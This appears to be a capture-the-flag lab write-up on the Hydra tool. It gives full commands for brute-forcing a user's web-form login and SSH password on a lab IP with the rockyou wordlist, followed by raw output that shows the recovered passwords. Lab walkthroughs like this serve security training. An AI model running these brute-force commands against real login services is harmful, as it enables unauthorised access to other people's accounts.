# Hydra
# Date: 25.09.2020

IP: `10.10.189.7`
--------------

1. Use Hydra to bruteforce molly's web password. What is flag 1?
	 - 'hydra -l molly -P /opt/rockyou.txt 10.10.189.7 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -V'

	 ///
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 15:54:30
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://10.10.189.7:80/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect.
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "123456" - 1 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "12345" - 2 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "password" - 4 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "princess" - 6 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "1234567" - 7 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "rockyou" - 8 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "12345678" - 9 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "abc123" - 10 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "nicole" - 11 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "daniel" - 12 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "babygirl" - 13 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "monkey" - 14 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "lovely" - 15 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "jessica" - 16 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "654321" - 17 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "michael" - 18 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "ashley" - 19 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "qwerty" - 20 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "111111" - 21 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "iloveu" - 22 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "000000" - 23 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "michelle" - 24 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "tigger" - 25 of 14344399 [child 8] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "sunshine" - 26 of 14344399 [child 9] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "chocolate" - 27 of 14344399 [child 13] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "password1" - 28 of 14344399 [child 14] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "soccer" - 29 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "anthony" - 30 of 14344399 [child 11] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "friends" - 31 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "butterfly" - 32 of 14344399 [child 12] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "purple" - 33 of 14344399 [child 5] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "angel" - 34 of 14344399 [child 3] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "jordan" - 35 of 14344399 [child 0] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "liverpool" - 36 of 14344399 [child 10] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "justin" - 37 of 14344399 [child 7] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "loveme" - 38 of 14344399 [child 1] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "fuckyou" - 39 of 14344399 [child 2] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "123123" - 40 of 14344399 [child 6] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "football" - 41 of 14344399 [child 4] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "secret" - 42 of 14344399 [child 15] (0/0)
[ATTEMPT] target 10.10.189.7 - login "molly" - pass "andrea" - 43 of 14344399 [child 13] (0/0)
[80][http-post-form] host: 10.10.189.7   login: molly   password: sunshine
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 15:54:36
	 ///

----------
2. Use Hydra to bruteforce molly's SSH password. What is flag 2?
	 - `hydra -l molly -P /opt/rockyou.txt ssh://10.10.189.7`

	 ///
Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-09-26 15:57:00
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.189.7:22/
[22][ssh] host: 10.10.189.7   login: molly   password: butterfly
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-09-26 15:57:10

	 ///
